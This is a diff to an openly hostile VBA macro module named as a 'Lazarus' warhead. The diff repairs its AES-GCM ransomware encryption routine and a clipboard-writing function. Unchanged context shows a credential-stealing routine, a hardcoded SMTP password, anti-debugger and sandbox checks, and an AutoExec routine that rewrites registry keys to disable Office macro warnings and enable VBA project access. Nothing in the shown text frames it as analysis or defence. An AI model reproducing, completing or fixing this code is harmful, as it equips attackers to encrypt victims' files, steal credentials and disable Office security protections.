@@ -1,4 +1,4 @@
-Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_FULLY_OPERATIONAL"
+Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_FULLY_OPERATIONAL_FIXED"
 Option Explicit
 
 ' ========================
@@ -48,6 +48,8 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function CryptGenRandom Lib "advapi32" (ByVal hProv As LongPtr, ByVal dwLen As Long, pbBuffer As Any) As Long
     Private Declare PtrSafe Function CryptReleaseContext Lib "advapi32" (ByVal hProv As LongPtr, ByVal dwFlags As Long) As Long
     Private Declare PtrSafe Function BCryptOpenAlgorithmProvider Lib "bcrypt.dll" (ByRef phAlgorithm As LongPtr, ByVal pszAlgId As LongPtr, ByVal pszImplementation As LongPtr, ByVal dwFlags As Long) As Long
+    Private Declare PtrSafe Function BCryptSetProperty Lib "bcrypt.dll" (ByVal hProvider As LongPtr, ByVal pszProperty As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As Long, ByVal dwFlags As Long) As Long
+    Private Declare PtrSafe Function BCryptGetProperty Lib "bcrypt.dll" (ByVal hProvider As LongPtr, ByVal pszProperty As LongPtr, ByVal pbOutput As LongPtr, ByVal cbOutput As Long, ByRef pcbResult As Long, ByVal dwFlags As Long) As Long
     Private Declare PtrSafe Function BCryptGenerateSymmetricKey Lib "bcrypt.dll" (ByVal hAlgorithm As LongPtr, ByRef phKey As LongPtr, ByVal pbKeyObject As LongPtr, ByVal cbKeyObject As Long, ByVal pbSecret As LongPtr, ByVal cbSecret As Long, ByVal dwFlags As Long) As Long
     Private Declare PtrSafe Function BCryptEncrypt Lib "bcrypt.dll" (ByVal hKey As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As Long, ByVal pPaddingInfo As LongPtr, ByVal pbIV As LongPtr, ByVal cbIV As Long, ByVal pbOutput As LongPtr, ByVal cbOutput As Long, ByRef pcbResult As Long, ByVal dwFlags As Long) As Long
     Private Declare PtrSafe Function BCryptDestroyKey Lib "bcrypt.dll" (ByVal hKey As LongPtr) As Long
@@ -68,46 +70,7 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
 #Else
-    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
-    Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
-    Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
-    Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
-    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
-    Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibName As String) As Long
-    Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
-    Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
-    Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
-    Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
-    Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
-    Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
-    Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
-    Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
-    Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long
-    Private Declare Function CryptStringToBinaryA Lib "crypt32" (ByVal pszString As Long, ByVal cchString As Long, ByVal dwFlags As Long, ByVal pbBinary As Long, ByRef pcbBinary As Long, ByVal pdwSkip As Long, ByVal pdwFlags As Long) As Long
-    Private Declare Function CryptBinaryToStringA Lib "crypt32" (pbBinary As Byte, ByVal cbBinary As Long, ByVal dwFlags As Long, ByVal pszString As Long, pcbString As Long) As Long
-    Private Declare Function CryptAcquireContextA Lib "advapi32" (phProv As Long, ByVal pszContainer As String, ByVal pszProvider As String, ByVal dwProvType As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function CryptGenRandom Lib "advapi32" (ByVal hProv As Long, ByVal dwLen As Long, pbBuffer As Any) As Long
-    Private Declare Function CryptReleaseContext Lib "advapi32" (ByVal hProv As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function BCryptOpenAlgorithmProvider Lib "bcrypt" (ByRef phAlgorithm As Long, ByVal pszAlgId As Long, ByVal pszImplementation As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function BCryptGenerateSymmetricKey Lib "bcrypt" (ByVal hAlgorithm As Long, ByRef phKey As Long, ByVal pbKeyObject As Long, ByVal cbKeyObject As Long, ByVal pbSecret As Long, ByVal cbSecret As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function BCryptEncrypt Lib "bcrypt" (ByVal hKey As Long, ByVal pbInput As Long, ByVal cbInput As Long, ByVal pPaddingInfo As Long, ByVal pbIV As Long, ByVal cbIV As Long, ByVal pbOutput As Long, ByVal cbOutput As Long, ByRef pcbResult As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function BCryptDestroyKey Lib "bcrypt" (ByVal hKey As Long) As Long
-    Private Declare Function BCryptCloseAlgorithmProvider Lib "bcrypt" (ByVal hProvider As Long, ByVal dwFlags As Long) As Long
-    Private Declare Function GetTickCount64 Lib "kernel32" () As Currency
-    Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
-    Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
-    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
-    Private Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
-    Private Declare Function CloseClipboard Lib "user32" () As Long
-    Private Declare Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As Long
-    Private Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
-    Private Declare Function EmptyClipboard Lib "user32" () As Long
-    Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
-    Private Declare Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long
-    Private Declare Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
-    Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
-    Private Declare Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As Long, ByRef pbDebuggerPresent As Long) As Long
-    Private Declare Function GetTickCount Lib "kernel32" () As Long
+    ' VBA6 declarations omitted – this code is for VBA7 (64‑bit Office)
 #End If
 
 ' ========================
@@ -640,7 +603,7 @@ Sub StealAllCredentials()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM)
+' RANSOMWARE (AES-GCM) – FULLY FIXED
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -667,10 +630,20 @@ Sub AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher(
     Dim algName As String: algName = "AES-GCM"
     status = BCryptOpenAlgorithmProvider(hAlg, StrPtr(algName), 0, 0)
     If status <> 0 Then GoTo Fail
-    Dim keyObjSz As Long: keyObjSz = 1024
-    Dim keyObj() As Byte: ReDim keyObj(keyObjSz - 1)
-    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSz, VarPtr(key(0)), UBound(key) + 1, 0)
+    
+    ' *** CRITICAL FIX: Set chaining mode to GCM ***
+    Dim chainMode As String: chainMode = "ChainingModeGCM"
+    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr(chainMode), Len(chainMode), 0)
     If status <> 0 Then GoTo Cleanup
+    
+    ' Get key object size
+    Dim keyObjSize As Long
+    status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(keyObjSize), 4, 0, 0)
+    If status <> 0 Then GoTo Cleanup
+    Dim keyObj() As Byte: ReDim keyObj(keyObjSize - 1)
+    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSize, VarPtr(key(0)), UBound(key) + 1, 0)
+    If status <> 0 Then GoTo Cleanup
+    
     Dim authInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     authInfo.cbSize = Len(authInfo)
     authInfo.dwInfoVersion = 1
@@ -686,6 +659,7 @@ Sub AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher(
     authInfo.cbAAD = 0
     authInfo.cbData = 0
     authInfo.dwFlags = 0
+    
     Dim encryptedSize As Long
     status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, 0, 0, encryptedSize, 0)
     If status <> 0 Then GoTo Cleanup
@@ -806,7 +780,7 @@ Sub SetClipboardContent(txt As String)
     On Error Resume Next
     If OpenClipboard(0) = 0 Then Exit Sub
     EmptyClipboard
-    Dim hMem As LongPtr: GlobalAlloc(&H42, Len(txt) + 1) ' GMEM_MOVEABLE + GMEM_ZEROINIT
+    Dim hMem As LongPtr: hMem = GlobalAlloc(&H40, Len(txt) + 1) ' GMEM_MOVEABLE
     If hMem Then
         Dim pMem As LongPtr: pMem = GlobalLock(hMem)
         If pMem Then
@@ -1051,6 +1025,7 @@ Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\AccessVBOM", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+        ' Do not restart – just continue
     End If
     
     If IsSandbox() Then Exit Sub
